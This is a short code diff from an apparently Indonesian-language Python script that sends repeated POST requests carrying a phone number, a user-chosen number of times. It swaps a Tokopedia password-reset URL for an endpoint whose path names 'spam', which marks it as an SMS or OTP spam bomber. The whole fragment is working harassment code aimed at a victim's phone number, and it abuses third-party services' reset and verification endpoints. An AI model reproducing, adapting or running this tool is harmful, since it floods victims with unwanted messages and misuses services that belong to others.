@@ -11,7 +11,7 @@ jum=int(input("[In] Jumlah: "))
 print("\n[RESULT]")
 for x in range(jum):
 	try:
-		req=requests.post("https://m.tokopedia.com/reset-password",
+		req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok",
 			data={"number":num})
 		if req.json()['status'] == 'ok':
 			print(f"{x+1}. Berhasil {num}")
